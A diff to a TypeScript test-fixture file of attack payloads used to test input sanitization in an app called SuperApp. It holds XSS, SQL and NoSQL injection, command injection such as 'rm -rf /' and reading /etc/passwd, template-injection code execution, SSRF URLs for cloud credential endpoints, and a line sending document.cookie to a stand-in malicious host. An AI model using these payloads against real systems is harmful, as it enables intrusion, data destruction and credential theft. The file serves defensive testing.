@@ -6,552 +6,374 @@
  * and other malicious inputs. These fixtures support testing of input validation and
  * sanitization utilities to ensure consistent security protection across all user
  * input fields in the SuperApp.
- * 
- * The fixtures are organized by attack vector type and include documentation about
- * what each fixture is testing.
  */
-
-// ======================================================================
-// XSS (Cross-Site Scripting) Attack Vectors
-// ======================================================================
 
 /**
- * Basic XSS attack vectors using script tags and common patterns
+ * Cross-Site Scripting (XSS) attack vectors
+ * These patterns attempt to inject JavaScript that executes in the browser
  */
-export const basicXssVectors = {
+export const xssAttackVectors = {
   // Basic script tag injection
-  scriptTag: '<script>alert("XSS")</script>',
-  scriptTagWithImg: '<img src="javascript:alert(\'XSS\');">',
-  scriptTagWithCharset: '<script charset="ISO-8859-1">alert("XSS");</script>',
+  basicScriptTag: '<script>alert("XSS");</script>',
+  scriptWithImg: '<img src="javascript:alert(\'XSS\');">',
+  scriptWithOnError: '<img src="x" onerror="alert(\'XSS\');">',
   
-  // Script with source
-  scriptWithSrc: '<script src="https://malicious-site.com/xss.js"></script>',
-  scriptWithBase64Src: '<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycpOw=="></script>',
+  // Event handler injections
+  onloadInjection: '<body onload="alert(\'XSS\');">',
+  onmouseoverInjection: '<div onmouseover="alert(\'XSS\');">Hover me</div>',
+  onclickInjection: '<button onclick="alert(\'XSS\');">Click me</button>',
   
-  // Encoded script tags
-  encodedScript: '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
-  unicodeEncodedScript: '\u003Cscript\u003Ealert(\u0022XSS\u0022)\u003C/script\u003E',
+  // Encoded attacks
+  urlEncoded: '%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E',
+  htmlEntityEncoded: '&lt;script&gt;alert("XSS");&lt;/script&gt;',
+  unicodeEncoded: '\u003Cscript\u003Ealert("XSS");\u003C/script\u003E',
   
-  // Script tag with line breaks
-  scriptWithLineBreaks: '<script\n\n>alert("XSS");</script>',
+  // React-specific vulnerabilities
+  dangerouslySetInnerHTML: '{"__html":"<script>alert(\'XSS\')</script>"}',
+  jsxInjection: '{() => alert("XSS")}',
+  hrefJavascript: '<a href="javascript:alert(\'XSS\');">Click me</a>',
   
-  // Null bytes to bypass filters
-  nullByteScript: '<scri\x00pt>alert("XSS")</scri\x00pt>',
+  // CSS-based attacks
+  cssExpression: '<div style="background-image: url(javascript:alert(\'XSS\'));">CSS XSS</div>',
+  cssWithImportant: '<div style="width: expression(alert(\'XSS\'))!important;">CSS XSS</div>',
 };
 
 /**
- * XSS attack vectors using event handlers
+ * SQL Injection attack vectors
+ * These patterns attempt to manipulate SQL queries to access or modify data
  */
-export const eventHandlerXssVectors = {
-  // Basic event handlers
-  onloadHandler: '<body onload="alert(\'XSS\');">',
-  onclickHandler: '<a href="#" onclick="alert(\'XSS\');">Click me</a>',
-  onerrorHandler: '<img src="x" onerror="alert(\'XSS\');">',
-  onmouseoverHandler: '<div onmouseover="alert(\'XSS\');">Hover over me</div>',
+export const sqlInjectionVectors = {
+  // Basic SQL injections
+  basicInjection: "' OR '1'='1",
+  commentTermination: "'; --",
+  unionSelect: "' UNION SELECT username, password FROM users; --",
+  batchedQueries: "'; DROP TABLE users; --",
   
-  // Less common event handlers
-  onfocusHandler: '<input onfocus="alert(\'XSS\');" autofocus>',
-  onblurHandler: '<input onblur="alert(\'XSS\');" autofocus>',
-  onchangeHandler: '<select onchange="alert(\'XSS\');"><option>1</option><option>2</option></select>',
+  // Blind SQL injection
+  blindInjection: "' OR (SELECT COUNT(*) FROM users) > 0; --",
+  timeBased: "'; WAITFOR DELAY '0:0:5'; --",
   
-  // Event handlers with encoded values
-  encodedOnload: '<body on&#108;oad="alert(\'XSS\');">',
-  
-  // Event handlers with line breaks
-  lineBreakHandler: '<img src="x" one\nrror="alert(\'XSS\');">',
+  // Advanced techniques
+  preparedStatementBypass: "\\'; exec sp_executesql N'SELECT * FROM users'; --",
+  hexEncoded: "0x2720554E494F4E2053454C45435420757365726E616D652C2070617373776F72642046524F4D207573657273", // Hex encoded version of ' UNION SELECT username, password FROM users
 };
 
 /**
- * XSS attack vectors using JavaScript URI schemes
+ * NoSQL Injection attack vectors
+ * These patterns target NoSQL databases like MongoDB
  */
-export const jsUriXssVectors = {
-  // Basic javascript: URI
-  javascriptUri: 'javascript:alert("XSS")',
-  javascriptUriInHref: '<a href="javascript:alert(\'XSS\');">Click me</a>',
-  
-  // Encoded javascript: URI
-  encodedJavascriptUri: 'javascript&#58;alert("XSS")',
-  encodedJavascriptUriHex: 'javascript&#x3A;alert("XSS")',
-  
-  // Data URI with JavaScript
-  dataUri: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+',
-  dataUriInImg: '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
-  
-  // Vbscript URI (for older IE browsers)
-  vbscriptUri: 'vbscript:alert("XSS")',
+export const noSqlInjectionVectors = {
+  // MongoDB injection
+  basicNoSql: '{ "$gt": "" }',
+  operatorInjection: '{ "username": { "$ne": null } }',
+  orOperator: '{ "$or": [ { "username": "admin" }, { "isAdmin": true } ] }',
+  whereExecution: '{ "$where": "this.password.length > 0" }',
+  functionExecution: '{ "$where": function() { return true; } }',
+  javascriptExecution: '{ "$where": "return db.users.findOne()" }',
 };
 
 /**
- * XSS attack vectors using CSS-based techniques
- */
-export const cssXssVectors = {
-  // CSS expression (old IE)
-  cssExpression: '<div style="background-color: expression(alert(\'XSS\'));">',
-  
-  // CSS with JavaScript URL
-  cssBackgroundUrl: '<div style="background-image: url(javascript:alert(\'XSS\'));">',
-  
-  // CSS imports
-  cssImport: '<style>@import url("javascript:alert(\'XSS\')");</style>',
-  
-  // CSS with behavior property (old IE)
-  cssBehavior: '<div style="behavior: url(javascript:alert(\'XSS\'));">',
-  
-  // CSS with -moz-binding (Firefox)
-  mozBinding: '<div style="-moz-binding: url(javascript:alert(\'XSS\'));">',
-};
-
-/**
- * XSS attack vectors specific to HTML5
- */
-export const html5XssVectors = {
-  // HTML5 video tag
-  videoTag: '<video src="x" onerror="alert(\'XSS\');">',
-  
-  // HTML5 audio tag
-  audioTag: '<audio src="x" onerror="alert(\'XSS\');">',
-  
-  // HTML5 embed tag
-  embedTag: '<embed src="javascript:alert(\'XSS\');">',
-  
-  // HTML5 svg tag
-  svgTag: '<svg onload="alert(\'XSS\');">',
-  svgTagWithScript: '<svg><script>alert("XSS")</script></svg>',
-  
-  // HTML5 canvas tag
-  canvasTag: '<canvas id="c"></canvas><script>alert(document.getElementById(\'c\').toDataURL());</script>',
-  
-  // HTML5 form overrides
-  formAction: '<form action="javascript:alert(\'XSS\');"><input type="submit"></form>',
-  
-  // HTML5 details tag
-  detailsTag: '<details open ontoggle="alert(\'XSS\');">',
-};
-
-/**
- * XSS attack vectors specifically targeting React applications
- */
-export const reactXssVectors = {
-  // dangerouslySetInnerHTML attack
-  dangerouslySetInnerHTML: '{__html: "<script>alert(\'XSS\')</script>"}',
-  
-  // React href attribute attack
-  reactHref: 'javascript:alert("XSS")',
-  
-  // React event handler injection
-  reactEventHandler: '{() => { alert("XSS") }}',
-  
-  // React component injection
-  reactComponentInjection: '<Component dangerouslySetInnerHTML={{__html: "<script>alert(\'XSS\')</script>"}} />',
-  
-  // React DOM node reference manipulation
-  reactDomRef: 'ref={el => { if (el) { el.innerHTML = "<script>alert(\'XSS\')</script>" } }}',
-};
-
-// ======================================================================
-// SQL Injection Attack Vectors
-// ======================================================================
-
-/**
- * Basic SQL injection attack vectors
- */
-export const basicSqlInjectionVectors = {
-  // Basic SQL injection with quotes
-  singleQuoteInjection: "' OR '1'='1",
-  doubleQuoteInjection: '" OR "1"="1',
-  
-  // Comment-based SQL injection
-  commentInjection: "' OR '1'='1' -- ",
-  hashCommentInjection: "' OR '1'='1' # ",
-  cStyleCommentInjection: "' OR '1'='1' /* */",
-  
-  // Numeric SQL injection (no quotes)
-  numericInjection: "1 OR 1=1",
-  
-  // Semicolon to chain queries
-  queryChaining: "'; DROP TABLE users; --",
-  
-  // Null byte injection
-  nullByteInjection: "'\0OR '1'='1",
-};
-
-/**
- * SQL injection attack vectors using UNION-based techniques
- */
-export const unionSqlInjectionVectors = {
-  // Basic UNION injection
-  basicUnion: "' UNION SELECT username, password FROM users --",
-  
-  // UNION with NULL values to match column count
-  unionWithNulls: "' UNION SELECT NULL, NULL, username, password FROM users --",
-  
-  // UNION with multiple tables
-  unionMultipleTables: "' UNION SELECT username, password FROM users UNION SELECT name, credit_card FROM customers --",
-  
-  // UNION with system tables (MySQL)
-  unionSystemTables: "' UNION SELECT table_name, column_name FROM information_schema.columns --",
-  
-  // UNION with string concatenation
-  unionConcat: "' UNION SELECT NULL, concat(username,':',password) FROM users --",
-};
-
-/**
- * SQL injection attack vectors using error-based techniques
- */
-export const errorSqlInjectionVectors = {
-  // Division by zero error
-  divisionByZero: "' OR 1/0 --",
-  
-  // Type conversion error
-  typeConversion: "' OR CAST('abc' AS INT) --",
-  
-  // MySQL error-based extraction
-  mysqlExtractError: "' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1), 0x7e)) --",
-  
-  // MSSQL error-based extraction
-  mssqlExtractError: "' AND 1=(SELECT 1/0 FROM users WHERE username='admin') --",
-  
-  // PostgreSQL error-based extraction
-  postgresqlExtractError: "' AND 1=cast((SELECT password FROM users LIMIT 1) as int) --",
-};
-
-/**
- * SQL injection attack vectors using blind techniques
- */
-export const blindSqlInjectionVectors = {
-  // Boolean-based blind injection
-  booleanBlind: "' OR (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5) --",
-  
-  // Time-based blind injection
-  timeBasedBlind: "' OR (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users) --",
-  mysqlTimeBasedBlind: "' OR IF(username='admin', SLEEP(5), 0) FROM users --",
-  mssqlTimeBasedBlind: "'; WAITFOR DELAY '0:0:5' --",
-  oracleTimeBasedBlind: "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0 --",
-  
-  // Conditional responses
-  conditionalResponse: "' OR (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users) --",
-};
-
-// ======================================================================
-// SSRF (Server-Side Request Forgery) Attack Vectors
-// ======================================================================
-
-/**
- * SSRF attack vectors targeting internal resources
- */
-export const ssrfInternalVectors = {
-  // Local file access
-  localFileAccess: 'file:///etc/passwd',
-  windowsLocalFileAccess: 'file:///c:/windows/win.ini',
-  
-  // Localhost access
-  localhost: 'http://localhost:8080/admin',
-  localhost127: 'http://127.0.0.1:8080/admin',
-  localhostIPv6: 'http://[::1]:8080/admin',
-  
-  // Internal network IPs
-  internalIP: 'http://192.168.1.1',
-  internalIPWithPort: 'http://10.0.0.1:8080/admin',
-  internalIPRange: 'http://172.16.0.1',
-  
-  // DNS rebinding
-  dnsRebinding: 'http://attacker-controlled-domain.com',
-  
-  // Non-standard localhost representations
-  localhostWithDots: 'http://127.0.0.1',
-  localhostDecimal: 'http://2130706433',  // Decimal representation of 127.0.0.1
-  localhostOctal: 'http://0177.0000.0000.0001',  // Octal representation
-  localhostHex: 'http://0x7f000001',  // Hex representation
-};
-
-/**
- * SSRF attack vectors targeting cloud metadata services
- */
-export const ssrfCloudVectors = {
-  // AWS metadata service
-  awsMetadata: 'http://169.254.169.254/latest/meta-data/',
-  awsUserData: 'http://169.254.169.254/latest/user-data/',
-  awsIamCredentials: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-  
-  // Google Cloud metadata
-  gcpMetadata: 'http://metadata.google.internal/computeMetadata/v1/',
-  gcpMetadataWithHeader: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
-  
-  // Azure metadata service
-  azureMetadata: 'http://169.254.169.254/metadata/instance',
-  azureMetadataWithParams: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
-  
-  // DigitalOcean metadata service
-  digitalOceanMetadata: 'http://169.254.169.254/metadata/v1.json',
-};
-
-/**
- * SSRF attack vectors using protocol exploitation
- */
-export const ssrfProtocolVectors = {
-  // Various protocol handlers
-  ftpProtocol: 'ftp://internal-ftp:21/',
-  ldapProtocol: 'ldap://internal-ldap:389/',
-  dictProtocol: 'dict://internal-dict:2628/info:server',
-  gopherProtocol: 'gopher://internal-gopher:70/1',
-  
-  // SMTP protocol for email sending
-  smtpProtocol: 'smtp://internal-smtp:25/',
-  
-  // Redis protocol exploitation
-  redisProtocol: 'redis://internal-redis:6379/info',
-  
-  // File protocol with directory traversal
-  fileTraversal: 'file:///var/www/../../etc/passwd',
-  
-  // Data URL for browser-based SSRF
-  dataUrl: 'data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==',
-  
-  // Jar protocol (Java specific)
-  jarProtocol: 'jar:http://malicious-server.com/payload.jar!/malicious-class',
-};
-
-// ======================================================================
-// Other Malicious Inputs
-// ======================================================================
-
-/**
- * Command injection attack vectors
+ * Command Injection attack vectors
+ * These patterns attempt to execute system commands
  */
 export const commandInjectionVectors = {
-  // Basic command injection
+  // Basic command injections
   basicInjection: '; ls -la',
-  pipeInjection: '| cat /etc/passwd',
-  ampersandInjection: '& echo vulnerable &',
+  pipeCommand: '| cat /etc/passwd',
+  backgroundCommand: '& echo vulnerable &',
+  nestedCommand: '$(echo vulnerable)',
+  backtickCommand: '`echo vulnerable`',
   
-  // Command substitution
-  backticksSubstitution: '`cat /etc/passwd`',
-  dollarSubstitution: '$(cat /etc/passwd)',
+  // Command chaining
+  andOperator: '&& cat /etc/passwd',
+  orOperator: '|| cat /etc/passwd',
   
-  // Newline injection
-  newlineInjection: 'input\ncat /etc/passwd',
-  
-  // Windows-specific command injection
-  windowsInjection: 'dir & ipconfig',
-  windowsNested: 'cmd.exe /c "type C:\\Windows\\win.ini"',
-  
-  // Time-based blind command injection
-  timeBasedInjection: '`sleep 5`',
-  windowsTimeBasedInjection: '& ping -n 5 127.0.0.1 &',
+  // Encoded commands
+  urlEncoded: '%3Bcat%20%2Fetc%2Fpasswd',
+  hexEncoded: '\x3B\x63\x61\x74\x20\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64', // ;cat /etc/passwd
 };
 
 /**
- * Path traversal attack vectors
+ * Path Traversal attack vectors
+ * These patterns attempt to access files outside the intended directory
  */
 export const pathTraversalVectors = {
   // Basic path traversal
   basicTraversal: '../../../etc/passwd',
-  windowsTraversal: '..\\..\\..\\Windows\\win.ini',
+  windowsTraversal: '..\\..\\..\\Windows\\system.ini',
   
-  // URL encoded traversal
-  urlEncodedTraversal: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-  doubleUrlEncodedTraversal: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
+  // Encoded traversal
+  urlEncoded: '%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
+  doubleEncoded: '%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
+  unicodeEncoded: '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
   
-  // Nested traversal
+  // Bypassing filters
   nestedTraversal: '....//....//....//etc/passwd',
-  
-  // Null byte to bypass file extension checks
-  nullByteTraversal: '../../../etc/passwd%00.png',
-  
-  // Non-standard encodings
-  unicodeTraversal: '..%c0%af..%c0%af..%c0%afetc/passwd',  // UTF-8 overlong encoding
-  
-  // Absolute path
-  absolutePath: '/etc/passwd',
-  windowsAbsolutePath: 'C:\\Windows\\win.ini',
+  mixedSeparators: '../\../\../etc/passwd',
 };
 
 /**
- * Template injection attack vectors
+ * HTML Injection attack vectors
+ * These patterns attempt to inject HTML that alters page structure
+ */
+export const htmlInjectionVectors = {
+  // Basic HTML injections
+  basicHtml: '<h1>Injected Header</h1>',
+  iframeInjection: '<iframe src="https://malicious-site.com"></iframe>',
+  formInjection: '<form action="https://malicious-site.com/collect" method="post"><input type="hidden" name="stolen" value="data"><input type="submit"></form>',
+  metaRefresh: '<meta http-equiv="refresh" content="0; url=https://malicious-site.com">',
+  
+  // Content spoofing
+  divOverlay: '<div style="position:absolute; top:0; left:0; width:100%; height:100%; background-color:white; z-index:9999;">Fake Content</div>',
+  loginForm: '<div style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:white; padding:20px; border:1px solid black;"><h2>Session Expired</h2><form><input type="text" placeholder="Username"><input type="password" placeholder="Password"><button>Login</button></form></div>',
+};
+
+/**
+ * CSRF (Cross-Site Request Forgery) attack vectors
+ * These patterns attempt to trick users into making unintended requests
+ */
+export const csrfVectors = {
+  // Basic CSRF payloads
+  imageRequest: '<img src="https://api.example.com/transfer?to=attacker&amount=1000" width="0" height="0">',
+  autoSubmitForm: '<form id="csrf-form" action="https://api.example.com/transfer" method="POST"><input type="hidden" name="to" value="attacker"><input type="hidden" name="amount" value="1000"></form><script>document.getElementById("csrf-form").submit();</script>',
+  clickjacking: '<style>iframe {opacity: 0.001; position: absolute; top: 0; left: 0; width: 100%; height: 100%;}</style><iframe src="https://legitimate-site.com/transfer"></iframe><button style="position: absolute; top: 300px; left: 300px;">Click me for a prize!</button>',
+};
+
+/**
+ * Template Injection attack vectors
+ * These patterns attempt to exploit template engines
  */
 export const templateInjectionVectors = {
-  // Server-side template injection
-  // Jinja2/Twig
-  jinja2Injection: '{{7*7}}',  // Should output 49 if vulnerable
-  jinja2RceInjection: '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}',
-  
-  // Freemarker
-  freemarkerInjection: '${7*7}',  // Should output 49 if vulnerable
-  freemarkerRceInjection: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
-  
-  // Velocity
-  velocityInjection: '#set($x = 7 * 7)${x}',  // Should output 49 if vulnerable
-  velocityRceInjection: '#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)$ex.getRuntime().exec("id")',
-  
-  // Handlebars
-  handlebarsInjection: '{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.push "alert(1)"}}
-      {{#with string.split as |codelist|}}
-        {{this.push "return eval"}}
-      {{/with}}
-      {{this.pop}}
-      {{this.pop}}
-      {{this.pop}}
-    {{/with}}
-  {{/with}}
-{{/with}}',
-  
-  // EJS
-  ejsInjection: '<%= 7 * 7 %>',  // Should output 49 if vulnerable
+  // Basic template injections for various engines
+  mustacheInjection: '{{constructor.constructor("alert(\'XSS\')")()}}',
+  handlebarsInjection: '{{#with "s" as |string|}}{{{call function.call.call string.sub.apply "alert(\'XSS\')"}}}{{/with}}',
+  ejsInjection: '<%= process.env.SECRET_KEY %>',
+  pugInjection: '#{process.mainModule.require("child_process").execSync("ls -la")}',
+  liquidInjection: '{% assign x = "process.env" | split: "." %}{{x[0][x[1]]}}',
 };
 
 /**
- * NoSQL injection attack vectors
+ * Nested Object Attack Vectors
+ * These objects contain malicious content embedded within nested structures
  */
-export const noSqlInjectionVectors = {
-  // MongoDB injection
-  mongoBasicInjection: '{ "$gt": "" }',  // Greater than empty string matches everything
-  mongoOrInjection: '{ "$or": [ { "username": "admin" }, { "username": "administrator" } ] }',
-  mongoWhereInjection: '{ "$where": "this.password == this.username" }',
-  mongoJsInjection: '{ "$where": "sleep(5000)" }',  // Time-based attack
-  
-  // MongoDB operator injection
-  mongoOperatorInjection: '{ "username": { "$ne": null } }',  // Not equal to null matches everything
-  mongoRegexInjection: '{ "username": { "$regex": "^admin" } }',  // Username starting with 'admin'
-  
-  // MongoDB aggregation injection
-  mongoAggregationInjection: '{ "$group": { "_id": null, "count": { "$sum": 1 } } }',
-  
-  // MongoDB JavaScript execution
-  mongoJsExecution: '{ "$function": { "body": "function() { return db.collection(\"users\").find().toArray(); }" } }',
-};
-
-// ======================================================================
-// Nested Object Test Cases with Embedded Malicious Content
-// ======================================================================
-
-/**
- * Nested objects with malicious content
- */
-export const nestedMaliciousObjects = {
-  // Simple nested object with XSS
-  simpleNested: {
-    user: {
-      name: '<script>alert("XSS")</script>',
-      id: 1
-    }
-  },
-  
-  // Deeply nested object with SQL injection
-  deeplyNested: {
-    data: {
-      user: {
-        profile: {
-          details: {
-            address: {
-              street: "' OR '1'='1"
-            }
-          }
-        }
-      }
-    }
-  },
-  
-  // Object with array containing malicious items
-  arrayNested: {
-    users: [
-      { name: 'Alice', role: 'user' },
-      { name: 'Bob', role: 'user' },
-      { name: '<script>alert("XSS")</script>', role: 'admin' }
-    ]
-  },
-  
-  // Object with multiple attack vectors
-  multiVectorNested: {
-    user: {
-      name: '<script>alert("XSS")</script>',
-      query: "' OR '1'='1",
-      command: '; rm -rf /',
-      url: 'http://169.254.169.254/latest/meta-data/'
-    }
-  },
-  
-  // Object with hidden payload in unexpected property
-  hiddenPayload: {
-    user: {
-      name: 'Alice',
-      age: 30,
-      __proto__: {
-        malicious: '<script>alert("XSS")</script>'
+export const nestedObjectAttackVectors = {
+  // Nested XSS in user profile
+  userProfile: {
+    name: 'John Doe',
+    bio: '<script>alert("XSS in bio");</script>',
+    contact: {
+      email: 'john@example.com',
+      website: 'javascript:alert("XSS in website");',
+      address: {
+        street: '<img src="x" onerror="alert(\'XSS in street\');">',
+        city: 'New York',
+        country: 'USA',
       },
-      toString: function() {
-        return '<script>alert("XSS")</script>';
-      }
-    }
+    },
+    preferences: {
+      theme: 'dark',
+      notifications: true,
+      customCss: 'body { background-image: url(javascript:alert(\'XSS in CSS\')); }',
+    },
   },
   
-  // Object with malicious content in property names
-  maliciousPropertyNames: {
-    user: {
-      name: 'Alice',
-      ['<script>alert("XSS")</script>']: 'malicious',
-      ['javascript:alert("XSS")']: 'malicious'
-    }
-  }
+  // Nested SQL injection in search parameters
+  searchParams: {
+    query: 'product',
+    filters: {
+      category: "' OR '1'='1",
+      price: {
+        min: 10,
+        max: "100; DROP TABLE products; --",
+      },
+      brand: [
+        'Brand1',
+        "Brand2' UNION SELECT username, password FROM users; --",
+      ],
+    },
+    sort: {
+      field: 'name',
+      direction: "asc'; UPDATE users SET isAdmin = true WHERE username = 'attacker'; --",
+    },
+  },
+  
+  // Nested command injection in configuration
+  configObject: {
+    appName: 'SuperApp',
+    server: {
+      host: 'localhost',
+      port: '8080; rm -rf /',
+      timeout: 30,
+    },
+    database: {
+      url: 'mongodb://localhost:27017/superapp',
+      options: {
+        user: 'admin',
+        password: 'password`; cat /etc/passwd; `',
+        pool: {
+          size: '10 & echo vulnerable &',
+        },
+      },
+    },
+    logging: {
+      level: 'info',
+      file: '../../../etc/passwd',
+    },
+  },
 };
 
 /**
- * Complex nested structures with hidden payloads
+ * React-Specific Vulnerabilities
+ * These patterns target React-specific security issues
  */
-export const complexNestedStructures = {
-  // Nested arrays with malicious content
-  nestedArrays: [
-    [1, 2, 3],
-    [4, 5, '<script>alert("XSS")</script>'],
-    [7, 8, 9, ['a', 'b', "' OR '1'='1"]]
-  ],
-  
-  // Mixed object and array nesting
-  mixedNesting: {
-    data: [
-      { safe: true },
-      [
-        { safe: false, payload: '<script>alert("XSS")</script>' },
-        { safe: false, nested: { payload: "' OR '1'='1" } }
-      ]
-    ]
+export const reactSpecificVectors = {
+  // dangerouslySetInnerHTML attacks
+  dangerousInnerHTML: {
+    __html: '<script>alert("XSS");</script>',
+  },
+  dangerousProps: {
+    dangerouslySetInnerHTML: {
+      __html: '<img src="x" onerror="alert(\'XSS\');">',
+    },
   },
   
-  // Object with circular references containing payloads
-  circularWithPayload: (() => {
-    const obj: any = { name: 'Circular' };
-    obj.self = obj;
-    obj.payload = '<script>alert("XSS")</script>';
-    return obj;
-  })(),
-  
-  // Object with getters that return malicious content
-  getterPayload: {
-    user: {
-      _name: 'Alice',
-      get name() {
-        return '<script>alert("XSS")</script>';
-      }
-    }
+  // JSX injection attempts
+  jsxExpressions: {
+    component: '{() => { alert("XSS") }}',
+    render: '{eval("alert(\'XSS\')");}',
   },
   
-  // Object with symbols containing malicious content
-  symbolPayload: (() => {
-    const obj: any = { visible: 'safe' };
-    obj[Symbol('hidden')] = '<script>alert("XSS")</script>';
-    return obj;
-  })(),
+  // Event handler exploits
+  eventHandlers: {
+    onClick: 'javascript:alert("XSS")',
+    onMouseOver: '{() => { document.location="https://malicious-site.com" }}',
+  },
   
-  // Object with non-enumerable properties containing payloads
-  nonEnumerablePayload: (() => {
-    const obj: any = { visible: 'safe' };
-    Object.defineProperty(obj, 'hidden', {
-      value: '<script>alert("XSS")</script>',
-      enumerable: false
-    });
-    return obj;
-  })()
+  // URL-based attacks for React Router
+  routerExploits: {
+    to: 'javascript:alert("XSS")',
+    href: 'javascript:fetch("https://malicious-site.com", {method:"POST",body:JSON.stringify(document.cookie)})',
+    redirect: 'data:text/html,<script>alert("XSS")</script>',
+  },
+};
+
+/**
+ * Common input patterns that should be sanitized
+ * These are everyday inputs that might need sanitization but aren't necessarily attacks
+ */
+export const commonSanitizationCases = {
+  // HTML content in regular text
+  textWithHtml: 'This is <b>bold</b> and <i>italic</i> text',
+  textWithEntities: 'Copyright &copy; 2023',
+  textWithEmoji: 'I love 😍 this app!',
+  
+  // Special characters
+  specialChars: '!@#$%^&*()_+{}|:"<>?[]\\;\',./',
+  quotesAndApostrophes: '"Double quotes" and \'single quotes\'',
+  
+  // Whitespace handling
+  leadingTrailingWhitespace: '  text with spaces  ',
+  multipleSpaces: 'text  with    multiple     spaces',
+  tabsAndNewlines: 'text\twith\ttabs\nand\nnewlines',
+  
+  // Numbers and formatting
+  phoneNumber: '(123) 456-7890',
+  currencyValue: '$1,234.56',
+  percentValue: '75%',
+};
+
+/**
+ * Combined test cases for comprehensive testing
+ * These objects combine multiple attack vectors for thorough testing
+ */
+export const combinedTestCases = {
+  // User registration form with multiple attack vectors
+  userRegistration: {
+    username: '<script>alert("XSS");</script>',
+    email: '\'OR 1=1; --@example.com',
+    password: 'password`; cat /etc/passwd; `',
+    confirmPassword: 'password`; cat /etc/passwd; `',
+    firstName: '<img src="x" onerror="alert(\'XSS\');">',
+    lastName: 'Doe',
+    address: {
+      street: '../../../etc/passwd',
+      city: 'New York\')); DROP TABLE users; --',
+      zipCode: '10001',
+      country: '<iframe src="https://malicious-site.com"></iframe>',
+    },
+    preferences: {
+      theme: 'dark',
+      newsletter: true,
+      bio: '{{constructor.constructor("alert(\'XSS\')")()}}',
+    },
+  },
+  
+  // Search form with multiple attack vectors
+  searchForm: {
+    query: '\'OR 1=1; --',
+    filters: {
+      category: '<script>alert("XSS");</script>',
+      priceRange: '10-100`; rm -rf /; `',
+      inStock: true,
+    },
+    sort: 'price_desc; DROP TABLE products; --',
+    page: '1 AND (SELECT sleep(5))',
+    perPage: '20\')); alert("XSS"); ((',
+  },
+  
+  // Comment submission with multiple attack vectors
+  commentSubmission: {
+    author: '<script>alert("XSS");</script>',
+    email: 'attacker@example.com',
+    website: 'javascript:alert("XSS")',
+    content: 'This is a legitimate comment\'OR 1=1; -- with <img src="x" onerror="alert(\'XSS\');"> and some `rm -rf /` commands.',
+    rating: '5; DROP TABLE comments; --',
+    parentId: '1 AND (SELECT sleep(5))',
+  },
+};
+
+/**
+ * Sanitization bypass attempts
+ * These patterns attempt to bypass common sanitization techniques
+ */
+export const sanitizationBypassVectors = {
+  // Bypassing HTML sanitizers
+  scriptWithoutClosingTag: '<script>alert("XSS")',
+  scriptWithEscapedChars: '<scr\x69pt>alert("XSS");</scr\x69pt>',
+  scriptWithMixedCase: '<ScRiPt>alert("XSS");</sCrIpT>',
+  scriptWithComments: '<scri<!-- comment -->pt>alert("XSS");</scri<!-- comment -->pt>',
+  
+  // Bypassing attribute filters
+  onErrorSplit: '<img src="x" one="" rror="alert(\'XSS\');">',
+  onErrorEncoded: '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
+  onErrorHexEncoded: '<img src="x" onerror="\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29">',
+  
+  // Bypassing URL sanitizers
+  dataUrl: 'data:text/html,<script>alert("XSS")</script>',
+  vbscriptUrl: 'vbscript:alert("XSS")',
+  javascriptWithNull: 'java\0script:alert("XSS")',
+  
+  // Bypassing SQL sanitizers
+  sqlWithComments: '\'/**/OR/**/1=1',
+  sqlWithAlternateChars: '\'\u004F\u0052 1=1',
+  sqlWithConcatenation: '\' || \'1\' || \'=\' || \'1',
+};
+
+/**
+ * Export all vectors as a single object for convenience
+ */
+export const allAttackVectors = {
+  xss: xssAttackVectors,
+  sql: sqlInjectionVectors,
+  noSql: noSqlInjectionVectors,
+  command: commandInjectionVectors,
+  path: pathTraversalVectors,
+  html: htmlInjectionVectors,
+  csrf: csrfVectors,
+  template: templateInjectionVectors,
+  nested: nestedObjectAttackVectors,
+  react: reactSpecificVectors,
+  common: commonSanitizationCases,
+  combined: combinedTestCases,
+  bypass: sanitizationBypassVectors,
 };
